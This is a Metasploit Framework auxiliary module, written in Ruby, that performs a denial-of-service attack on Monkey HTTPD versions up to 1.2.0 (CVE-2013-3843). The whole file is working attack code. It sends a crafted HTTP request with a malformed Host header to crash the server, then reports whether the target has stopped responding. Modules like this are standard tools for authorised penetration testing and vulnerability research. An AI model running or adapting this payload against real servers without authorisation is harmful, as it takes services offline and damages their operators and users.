##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Monkey HTTPD Headers',
			'Description'    => %q{
				Improper header parsing leads to a segmentation
				fault when a specially crafted request is sent to
				the server.  Affects version <= 1.2.0.
			},
			'Author'         =>
				[
					'Doug Prostko <dougtko[at]gmail[dot]com>'
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					['CVE', '2013-3843'],
				],
			'DisclosureDate' => 'May 30 2013'))

		register_options(
			[
				Opt::RPORT(2001),
			], self.class)
	end

	def run
		2.times do
			begin
				connect
				print_status("Sending DoS packet to #{rhost}:#{rport}")
				sock.put("GET / HTTP/1.1\r\nHost:\r\n\r\nlocalhost\r\nUser-Agent:foo\r\n\r\n")
				disconnect
				sleep 1
			rescue ::Rex::ConnectionRefused
				print_good("Unable to connect to #{rhost}:#{rport}.")
				break
			rescue ::Errno::ECONNRESET
				print_good("DoS packet successful. #{rhost} not responding.")
				break
			rescue ::Rex::HostUnreachable
				print_good("Couldn't connect to #{rhost}:#{rport}.")
				break
			rescue ::Timeout::Error, ::Errno::EPIPE
				print_good("Timeout error connecting to #{rhost}:#{rport}.")
				break
			rescue ::Rex::ConnectionTimeout
				print_good("Monkey server is down!")
				break
			ensure
				disconnect
			end
		end
	end
end
